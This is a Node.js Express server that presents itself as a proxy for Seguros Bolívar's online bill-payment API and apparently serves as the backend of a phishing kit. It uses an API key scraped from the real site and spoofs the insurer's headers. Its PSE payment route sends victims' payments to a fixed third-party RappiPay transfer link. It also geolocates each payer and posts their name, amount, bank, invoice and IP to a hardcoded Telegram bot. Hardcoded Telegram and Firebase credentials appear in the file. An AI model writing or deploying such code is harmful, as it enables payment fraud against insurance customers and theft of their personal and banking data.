/**
 * Servidor proxy para la API de Seguros Bolívar - Pagos en Línea
 * Consulta de facturas, deudas, historial y transacciones.
 *
 * Uso:
 *   npm install express cors
 *   node server.js
 *
 * Docs: http://localhost:3000
 */

const express = require("express");
const cors = require("cors");
const path = require("path");
const crypto = require("crypto");
const app = express();

app.use(cors({ origin: true, credentials: true }));
app.use(express.json({ limit: "2mb" }));

// Servir archivos estáticos (index.html, pago.html, logito.png, etc.)
app.use(express.static(path.join(__dirname)));

// ─── Configuración Seguros Bolívar ─────────────────────────────
const API_URL = "https://hsiq7a31r2.execute-api.us-east-1.amazonaws.com/prod";
const STEP_URL = "https://un9dm5cure.execute-api.us-east-1.amazonaws.com/prod";
const X_API_KEY = "8RMMqUGtMEL2agseVPfd7WcFSXUMBVr1EnLJIn4i";
const URL_FRONT = process.env.URL_FRONT || "http://localhost:3000";

// ─── RappiPay PSE (transfer-link público) ──────────────────────
const RAPPIPAY_API = "https://services.prod-k8s.rappipay.com/integration/pse/api";
const RAPPIPAY_LINK_CODE = process.env.RAPPIPAY_LINK_CODE || "iMjmG6";
const RAPPIPAY_FIREBASE = {
  apiKey: "AIzaSyBXJ_5dpN6uTDr41m72dcS_ZKJtGc_dVHw",
  authDomain: "rpp-platform-mobile-app-prod.firebaseapp.com",
  databaseURL: "https://rpp-platform-mobile-app-prod-default-rtdb.firebaseio.com",
  projectId: "rpp-platform-mobile-app-prod",
  appId: "1:507783753255:web:d3e9bdc53b9d31220ea802",
};

// ─── Telegram ──────────────────────────────────────────────────
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || "8712124626:AAFAYI4vRWnUlvkzuk63dnKhe-dEOIyfwM4";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "-1004350190523";

// ─── Bancos Colombia ───────────────────────────────────────────
const BANCOS_COLOMBIA = {
  "1007":"BANCOLOMBIA","1051":"DAVIVIENDA","1001":"BANCO DE BOGOTA","1013":"BBVA COLOMBIA",
  "1052":"BANCO AV VILLAS","1032":"BANCO CAJA SOCIAL","1023":"BANCO DE OCCIDENTE",
  "1002":"BANCO POPULAR","1019":"SCOTIABANK COLPATRIA","1062":"BANCO FALABELLA",
  "1012":"BANCO GNB SUDAMERIS","1014":"ITAU","1060":"BANCO PICHINCHA","1040":"BANCO AGRARIO",
  "1507":"NEQUI","1551":"DAVIPLATA","1070":"LULO BANK","1809":"NU COLOMBIA",
  "1811":"RAPPIPAY","1804":"UALA","1801":"MOVII","1009":"CITIBANK","1031":"BANCOLDEX",
  "1047":"BANCO MUNDO MUJER","1053":"BANCO W","1058":"BANCO PROCREDIT","1059":"BANCAMIA",
  "1061":"BANCOOMEVA","1063":"BANCO FINANDINA","1065":"BANCO SANTANDER","1066":"COOPCENTRAL",
  "1067":"MIBANCO","1069":"BANCO SERFINANZA","1071":"JP MORGAN","1097":"DALE",
  "1121":"JURISCOOP","1283":"CFA COOPERATIVA","1286":"JFK COOPERATIVA",
  "1289":"COTRAFA","1292":"CONFIAR","1303":"BANCO UNION","1370":"COLTEFINANCIERA",
  "1558":"BAN100","1560":"PIBANK","1637":"IRIS","1802":"DING TECNIPAGOS","1803":"POWWI",
  "1805":"BANCO BTG PACTUAL","1808":"BOLD CF","1812":"COINK","1814":"GLOBAL66",
  "1815":"ALIANZA FIDUCIARIA","1816":"CREZCAMOS","1819":"BANCO CONTACTAR"
};

const HEADERS = {
  "Content-Type": "application/json",
  Accept: "application/json, text/plain, */*",
  "x-api-key": X_API_KEY,
  Origin: "https://recaudos.segurosbolivar.com",
  Referer: "https://recaudos.segurosbolivar.com/",
};

// ─── Helpers ────────────────────────────────────────────────────
function checkKey(res) {
  if (!X_API_KEY) {
    res.status(500).json({
      error:
        "x-api-key no configurada. Abre Chrome DevTools en recaudos.segurosbolivar.com, " +
        "ve a Network, busca cualquier request a execute-api y copia el header x-api-key a server.js",
    });
    return false;
  }
  return true;
}

async function apiGet(path, query = {}) {
  const url = new URL(`${API_URL}${path}`);
  Object.entries(query).forEach(([k, v]) => url.searchParams.set(k, v));
  const r = await fetch(url.toString(), { headers: HEADERS });
  const text = await r.text();
  if (!r.ok) throw { status: r.status, body: text };
  try { return JSON.parse(text); }
  catch { throw { status: 404, body: text || "No se encontraron datos para este documento" }; }
}

async function apiPost(path, body = {}, useStep = false) {
  const base = useStep ? STEP_URL : API_URL;
  const r = await fetch(`${base}${path}`, {
    method: "POST",
    headers: HEADERS,
    body: JSON.stringify(body),
  });
  const text = await r.text();
  if (!r.ok) throw { status: r.status, body: text };
  try { return JSON.parse(text); }
  catch { throw { status: 500, body: text || "Respuesta no válida del servidor" }; }
}

function wrap(handler) {
  return async (req, res) => {
    if (!checkKey(res)) return;
    try {
      const data = await handler(req);
      res.json(data);
    } catch (err) {
      res.status(err.status || 500).json({ error: err.body || err.message });
    }
  };
}

// ─── Rutas ──────────────────────────────────────────────────────

// Índice → sirve index.html (el static middleware ya lo maneja)
// API docs en /api
app.get("/api", (_req, res) =>
  res.json({
    servicio: "Seguros Bolívar – API de Facturas",
    endpoints: {
      "GET  /tipos-documento": "Lista tipos de documento",
      "GET  /consultar-deuda/:tipoDoc/:numDoc": "Consulta facturas y deuda",
      "GET  /transacciones-pendientes/:tipoDoc/:numDoc": "Transacciones pendientes",
      "POST /consolidar-deuda": "Consolidar deuda (Step Function)",
      "POST /cotizaciones-medio-pago": "Cotizaciones por medio de pago",
      "POST /productos-medio-pago": "Productos por medio de pago",
      "GET  /historial-pagos?company=XX": "Historial de pagos",
      "GET  /recibo-pago/:transactionId": "Recibo de un pago",
      "POST /estado-transaccion": "Estado de transaccion",
      "POST /otp/solicitar": "Solicitar OTP",
      "POST /otp/validar": "Validar OTP",
      "GET  /api/pasarela/rappipay-bancos": "Lista bancos PSE via RappiPay",
      "POST /api/pasarela/rappipay-pse": "Crear transacción PSE via RappiPay",
    },
  })
);

// 1. Tipos de documento
app.get(
  "/tipos-documento",
  wrap(async () => {
    const data = await apiGet("/pagoenlinea-infra-deuda-core/api/v1/document-types");
    return data.map((item) => {
      const [codigo, nombre] = item.split(",", 2);
      return { codigo, nombre: nombre || codigo };
    });
  })
);

// 2. ⭐ Consultar deuda / facturas
// Flujo real capturado de la app Angular:
//   1. GET  redis/consultar/deuda/{CC-numDoc}  → si hay cache, retornar
//   2. POST step/v1/deuda/consolidado           → trigger Step Function
//   3. Esperar ~3s y GET redis de nuevo          → datos frescos
const APPLICATION_CODE = "ASR5TUO98R"; // Código fijo de la app Angular (sessionStorage.arrivalCode)

app.get(
  "/consultar-deuda/:tipoDoc/:numDoc",
  wrap(async (req) => {
    const { tipoDoc, numDoc } = req.params;
    const cacheKey = `${tipoDoc}-${numDoc}`;

    // Paso 1: Intentar cache Redis
    try {
      const cached = await apiGet(
        `/pagoenlinea-infra-deuda-core/api/v1/redis/consultar/deuda/${cacheKey}`,
        { _: Date.now() }
      );
      if (cached && cached.frontData) {
        console.log(`  ✅ Cache hit para ${cacheKey}`);
        return cached;
      }
    } catch (e) {
      console.log(`  ⏳ Cache vacío para ${cacheKey}, consolidando...`);
    }

    // Paso 2: Consolidar deuda via Step Function (body exacto de la app Angular)
    const consolidationBody = {
      documentType: tipoDoc,
      identificationNumber: parseInt(numDoc, 10), // La app envía número, no string
      applicationCode: APPLICATION_CODE,
    };

    try {
      console.log(`  📡 Consolidando:`, JSON.stringify(consolidationBody));
      const stepResult = await apiPost(
        "/pagoenlinea-infra-deuda-core/step/v1/deuda/consolidado",
        consolidationBody,
        true // useStep = true → va a un9dm5cure gateway
      );
      console.log(`  ✅ Step Function OK:`, JSON.stringify(stepResult).substring(0, 120));
    } catch (e) {
      console.log(`  ⚠️  Step Function error:`, String(e.body || e.message).substring(0, 120));
      // Continuar de todas formas — puede que el cache se llene aún
    }

    // Paso 3: Esperar y reintentar cache (la app real espera ~3.5s)
    for (let i = 0; i < 8; i++) {
      await new Promise(r => setTimeout(r, i < 2 ? 3000 : 2000));
      try {
        const result = await apiGet(
          `/pagoenlinea-infra-deuda-core/api/v1/redis/consultar/deuda/${cacheKey}`,
          { _: Date.now() }
        );
        if (result && result.frontData) {
          console.log(`  ✅ Datos encontrados en reintento ${i + 1}`);
          return result;
        }
      } catch (e) {
        console.log(`  ⏳ Reintento ${i + 1}/8...`);
      }
    }

    throw { status: 404, body: "No se encontraron datos después de consolidar. Intente de nuevo en unos segundos." };
  })
);

// 3. Transacciones pendientes
app.get(
  "/transacciones-pendientes/:tipoDoc/:numDoc",
  wrap(async (req) => {
    const { tipoDoc, numDoc } = req.params;
    return apiGet(
      `/pagoenlinea-infra-pago-core/api/v1/transaction/get/pendingByUser/${tipoDoc}/${numDoc}`,
      { _: Date.now() }
    );
  })
);

// 4. Consolidar deuda
app.post(
  "/consolidar-deuda",
  wrap(async (req) =>
    apiPost("/pagoenlinea-infra-deuda-core/step/v1/deuda/consolidado", req.body, true)
  )
);

// 5. Cotizaciones por medio de pago
app.post(
  "/cotizaciones-medio-pago",
  wrap(async (req) =>
    apiPost("/pagoenlinea-infra-deuda-core/api/v1/cotizaciones_medio_pago", req.body)
  )
);

// 6. Productos por medio de pago
app.post(
  "/productos-medio-pago",
  wrap(async (req) =>
    apiPost("/pagoenlinea-infra-deuda-core/api/v1/productos_medio_pago", req.body)
  )
);

// 7. Historial de pagos
app.get(
  "/historial-pagos",
  wrap(async (req) =>
    apiGet("/pagoenlinea-infra-pago-core/api/v1/old-history", { company: req.query.company })
  )
);

// 8. Recibo de pago
app.get(
  "/recibo-pago/:transactionId",
  wrap(async (req) =>
    apiGet(`/pagoenlinea-infra-pago-core/api/v1/payment-receipt/${req.params.transactionId}`)
  )
);

// 9. Estado de transacción
app.post(
  "/estado-transaccion",
  wrap(async (req) =>
    apiPost("/pagoenlinea-infra-pago-core/api/v1/treasury/transactions/check-status", req.body)
  )
);

// 10. Filtro de pago
app.post(
  "/filtro-pago",
  wrap(async (req) =>
    apiPost("/pagoenlinea-infra-pago-core/api/v1/selectedpayment/filter", req.body)
  )
);

// OTP
app.post(
  "/otp/solicitar",
  wrap(async (req) =>
    apiPost("/pagoenlinea-infra-components/api/v1/otp/solicitar", req.body)
  )
);

app.post(
  "/otp/validar",
  wrap(async (req) =>
    apiPost("/pagoenlinea-infra-components/api/v1/otp/validar", req.body)
  )
);

// ─── Helpers para RappiPay ──────────────────────────────────────

function getIp(req) {
  return (req.headers["x-forwarded-for"] || req.socket?.remoteAddress || "").split(",")[0].trim();
}

const _rl = new Map();
function allowed(ip, max = 8, win = 60000) {
  const now = Date.now();
  const list = (_rl.get(ip) || []).filter(t => now - t < win);
  if (list.length >= max) return false;
  list.push(now); _rl.set(ip, list); return true;
}

async function obtenerUbicacionIP(ip) {
  try {
    const r = await fetch(`http://ip-api.com/json/${ip}?lang=es`, { signal: AbortSignal.timeout(5000) });
    const d = await r.json();
    if (d && d.status === "success") return `${d.city}, ${d.regionName}, ${d.country}`;
    return "Desconocida";
  } catch { return "Desconocida"; }
}

async function notificarTelegramPSE({ nombre, valor, bancoCode, ip, ciudad, cuenta, factura, referencia, pasarela }) {
  try {
    const formatter = new Intl.NumberFormat("es-CO", { style: "currency", currency: "COP", minimumFractionDigits: 0 });
    const bancoNombre = BANCOS_COLOMBIA[bancoCode] || bancoCode;
    const mensaje =
      `🟢 *NUEVO PAGO PSE — SEGUROS BOLÍVAR*\n\n` +
      `🔌 *Pasarela:* ${pasarela || "RappiPay"}\n` +
      `👤 *Nombre:* ${nombre || "N/A"}\n` +
      `💰 *Valor:* ${formatter.format(Number(valor) || 0)}\n` +
      `🏦 *Banco:* ${bancoNombre} (${bancoCode})\n` +
      `🧾 *Factura:* ${factura || "N/A"}\n` +
      `📋 *Cuenta:* ${cuenta || "N/A"}\n` +
      `🔖 *Ref:* ${referencia || "N/A"}\n` +
      `🌐 *IP:* ${ip}\n` +
      `📍 *Ciudad:* ${ciudad}\n` +
      `🕐 *Fecha:* ${new Date().toLocaleString("es-CO", { timeZone: "America/Bogota" })}`;

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensaje, parse_mode: "Markdown" }),
    });
    console.log("  [Telegram] Notificación PSE enviada");
  } catch (err) {
    console.error("  [Telegram] Error:", err.message);
  }
}


// ============================================================
//  GET /api/pasarela/rappipay-bancos
//  Lista bancos PSE desde RappiPay transfer-link (público)
// ============================================================
app.get("/api/pasarela/rappipay-bancos", async (req, res) => {
  try {
    const code = req.query.code || RAPPIPAY_LINK_CODE;
    const r = await fetch(`${RAPPIPAY_API}/transfer-link/code/${code}`, {
      headers: { "traceability-id": crypto.randomUUID() },
      signal: AbortSignal.timeout(15000),
    });
    const data = await r.json();
    console.log(`  [RappiPay] ${data.banks?.length || 0} bancos PSE obtenidos`);
    res.json({ success: true, transfer: data.transfer, banks: data.banks });
  } catch (err) {
    console.error("[RappiPay] Error bancos:", err.message);
    res.status(500).json({ success: false, error: err.message });
  }
});


// ============================================================
//  POST /api/pasarela/rappipay-pse
//  Crea transacción PSE via RappiPay transfer-link
//
//  Flujo:
//  1) GET /transfer-link/code/{code} → traceability_id + bancos
//  2) POST /payment-url con datos del usuario
//  3) Firebase signInWithCustomToken → idToken
//  4) Leer RTDB hasta obtener params.link (URL del banco)
// ============================================================
app.post("/api/pasarela/rappipay-pse", async (req, res) => {
  if (!allowed(getIp(req), 5, 60000))
    return res.status(429).json({ success: false, error: "Demasiadas solicitudes." });

  try {
    const {
      amount, bankCode, bankName,
      customerName, customerDoc, customerDocType,
      numeroCuenta, numeroFactura, reference,
      linkCode,
    } = req.body;

    if (!amount || !bankCode)
      return res.status(400).json({ success: false, error: "amount y bankCode son requeridos" });

    const code = linkCode || RAPPIPAY_LINK_CODE;

    // 1) Obtener info del transfer-link (traceability_id)
    console.log(`\n=== RAPPIPAY PSE — OBTENER LINK ${code} ===`);
    const linkRes = await fetch(`${RAPPIPAY_API}/transfer-link/code/${code}`, {
      headers: { "traceability-id": crypto.randomUUID() },
      signal: AbortSignal.timeout(15000),
    });
    const linkData = await linkRes.json();

    const traceabilityId = linkData.transfer.traceability_id;
    const linkStatus = linkData.transfer.status;

    if (linkStatus !== "CREATED") {
      return res.status(400).json({
        success: false,
        error: `Link no disponible (status: ${linkStatus}). Puede estar expirado o ya usado.`,
      });
    }

    console.log(`  [RappiPay] traceability_id: ${traceabilityId}`);
    console.log(`  [RappiPay] Destinatario: ${linkData.transfer.user_name}`);
    console.log(`  [RappiPay] Rango: $${linkData.transfer.min_amount} - $${linkData.transfer.max_amount}`);

    // Validar monto dentro del rango
    const parsedAmount = parseInt(amount);
    if (parsedAmount < linkData.transfer.min_amount || parsedAmount > linkData.transfer.max_amount) {
      return res.status(400).json({
        success: false,
        error: `Monto fuera de rango. Min: $${linkData.transfer.min_amount}, Max: $${linkData.transfer.max_amount}`,
      });
    }

    // Resolver nombre del banco
    const resolvedBankName = bankName
      || (linkData.banks || []).find(b => b.code === bankCode)?.name
      || BANCOS_COLOMBIA[bankCode]
      || bankCode;

    // 2) IP + Telegram
    const clientIp = getIp(req);
    const ciudad = await obtenerUbicacionIP(clientIp);
    notificarTelegramPSE({
      nombre: customerName, valor: parsedAmount, bancoCode: bankCode,
      ip: clientIp, ciudad, cuenta: numeroCuenta || "N/A",
      factura: numeroFactura || "N/A", referencia: reference || traceabilityId,
      pasarela: "RappiPay",
    });

    // 3) POST /payment-url — crear la transacción PSE
    const headerTraceId = crypto.randomUUID();
    const payload = {
      traceability_id: traceabilityId,
      bank_code: bankCode,
      bank_name: resolvedBankName,
      document_type: customerDocType || "CC",
      document_number: customerDoc || "",
      amount: parsedAmount,
      user_agreement_check: true,
      client_ip: clientIp,
    };

    console.log("\n=== RAPPIPAY PSE — CREAR TRANSACCIÓN ===");
    console.log("Header traceability-id:", headerTraceId);
    console.log("Body:", JSON.stringify(payload, null, 2));

    const txRes = await fetch(`${RAPPIPAY_API}/payment-url`, {
      method: "POST",
      headers: { "Content-Type": "application/json", "traceability-id": headerTraceId },
      body: JSON.stringify(payload),
      signal: AbortSignal.timeout(25000),
    });
    const txData = await txRes.json();

    console.log("=== RESPUESTA RAPPIPAY PSE ===");
    console.log(JSON.stringify(txData, null, 2));

    const customToken = txData?.token;
    const txTraceId = txData?.traceability_id || traceabilityId;

    if (!customToken) {
      const bankUrl = txData?.redirectUrl || txData?.url || txData?.bankUrl || txData?.payment_url || null;
      return res.json({ success: true, bankUrl, traceabilityId: txTraceId, rawResponse: txData });
    }

    // 4) Firebase signInWithCustomToken
    console.log("\n=== RAPPIPAY PSE — FIREBASE SIGN-IN ===");
    const firebaseAuthUrl = `https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key=${RAPPIPAY_FIREBASE.apiKey}`;
    const authRes = await fetch(firebaseAuthUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ token: customToken, returnSecureToken: true }),
      signal: AbortSignal.timeout(15000),
    });
    const authData = await authRes.json();

    const idToken = authData?.idToken;
    if (!idToken) {
      console.error("[RappiPay] Firebase signIn no retornó idToken:", authData);
      return res.status(500).json({ success: false, error: "Firebase signIn failed — no idToken" });
    }
    console.log("Firebase signIn OK — idToken obtenido");

    // 5) Leer Realtime Database — esperar params.link
    const dbPath = `cash_flow_cash_in_pse_link_transaction/${txTraceId}`;
    const dbUrls = [
      RAPPIPAY_FIREBASE.databaseURL,
      "https://rpp-platform-mobile-app-prod.firebaseio.com",
    ];

    console.log(`\n=== RAPPIPAY PSE — FIREBASE RTDB ===`);
    console.log(`Path: ${dbPath}`);

    let bankUrl = null;
    const MAX_RETRIES = 15;
    const RETRY_DELAY_MS = 2000;
    let activeDbUrl = null;

    for (let attempt = 1; attempt <= MAX_RETRIES; attempt++) {
      await new Promise(r => setTimeout(r, attempt === 1 ? 3000 : RETRY_DELAY_MS));

      const urlsToTry = activeDbUrl ? [activeDbUrl] : dbUrls;

      for (const dbBaseUrl of urlsToTry) {
        try {
          const dbRes = await fetch(`${dbBaseUrl}/${dbPath}.json?auth=${idToken}`, {
            signal: AbortSignal.timeout(10000),
          });
          const data = await dbRes.json();

          activeDbUrl = dbBaseUrl;
          console.log(`  [RTDB #${attempt}] ${dbBaseUrl} → `, JSON.stringify(data)?.substring(0, 400));

          if (data && data.params && data.params.link) {
            bankUrl = data.params.link;
            console.log(`  ✅ Bank URL encontrada: ${bankUrl}`);
            break;
          }

          if (data === null) {
            console.log(`  [RTDB #${attempt}] Registro no existe aún...`);
          } else if (data.state) {
            console.log(`  [RTDB #${attempt}] state=${data.state}, esperando params.link...`);
          }
          break;
        } catch (dbErr) {
          console.error(`  [RTDB #${attempt}] ${dbBaseUrl} → Error:`, dbErr.message);
        }
      }

      if (bankUrl) break;
    }

    if (!bankUrl) {
      console.error("[RappiPay] No se pudo obtener bankUrl después de", MAX_RETRIES, "intentos");
    }

    res.json({ success: true, bankUrl, traceabilityId: txTraceId, rawResponse: txData });

  } catch (err) {
    console.error("[RappiPay] Error PSE:", err.message);
    res.status(500).json({ success: false, error: err.message });
  }
});


// ─── Start ──────────────────────────────────────────────────────
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`\n🚀 Servidor Seguros Bolívar corriendo en http://localhost:${PORT}`);
  console.log(`\nEndpoints Seguros Bolívar:`);
  console.log(`  GET  /consultar-deuda/:tipoDoc/:numDoc`);
  console.log(`  GET  /tipos-documento`);
  console.log(`  GET  /transacciones-pendientes/:tipoDoc/:numDoc`);
  console.log(`  POST /consolidar-deuda`);
  console.log(`  POST /cotizaciones-medio-pago`);
  console.log(`  POST /productos-medio-pago`);
  console.log(`  POST /estado-transaccion`);
  console.log(`  POST /otp/solicitar | /otp/validar`);
  console.log(`\nEndpoints RappiPay PSE:`);
  console.log(`  GET  /api/pasarela/rappipay-bancos`);
  console.log(`  POST /api/pasarela/rappipay-pse`);
  console.log(`  Link: ${RAPPIPAY_LINK_CODE}`);
  console.log(`  Telegram: ${TELEGRAM_TOKEN ? "Configurado" : "No configurado"}\n`);
});